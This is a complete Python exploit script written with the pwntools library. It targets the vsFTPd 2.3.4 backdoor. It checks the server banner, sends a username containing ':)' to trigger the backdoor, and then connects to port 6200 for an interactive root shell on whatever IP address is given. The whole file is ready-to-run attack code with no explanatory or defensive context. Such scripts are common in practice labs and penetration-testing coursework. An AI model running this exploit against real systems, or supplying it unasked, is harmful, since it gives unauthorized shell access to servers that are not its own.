#!/usr/bin/python3

from pwn import *
from sys import exit
from time import sleep

class ExploitFTP:
    def __init__(self, ip, port=21):
        self.ip = ip
        self.port = port
        self.p = log.progress("FTP Exploit")
    
    def trigger_backdoor(self):
        try:
            self.p.status("Checking Version...")
            io = remote(self.ip, self.port)
            io.recvuntil(b"vsFTPd ")
            version = (io.recvuntil(b")")[:-1]).decode()

            if version != "2.3.4":
                self.p.failure("Version 2.3.4 Not Found!!!")
                io.close()
                exit()
            else:
                self.p.status("Triggering Backdoor....")
                io.sendline(b"USER hello:)")
                io.sendline(b"PASS hello123")
                io.close()
        except Exception as e:
            self.p.failure(f"Error triggering backdoor: {e}")
            exit()

    def get_shell(self):
        try:
            self.p.status("Connecting to Backdoor on port 6200...")
            sleep(1)
            io = remote(self.ip, 6200, timeout=10)
            self.p.success("Got Shell!!!")
            io.interactive()
            io.close()
        except Exception as e:
            self.p.failure(f"Failed to connect to backdoor: {e}")
            exit()

if __name__ == "__main__":
    try:
        if len(sys.argv) < 2 or len(sys.argv) > 3:
            log.error(f"Usage: {sys.argv[0]} IP PORT(optional)")
            exit()

        if len(sys.argv) == 3:
            exploit = ExploitFTP(sys.argv[1], int(sys.argv[2]))
        else:
            exploit = ExploitFTP(sys.argv[1])

        exploit.trigger_backdoor()
        exploit.get_shell()

    except KeyboardInterrupt:
        log.info("Execution interrupted by user.")
        exit()
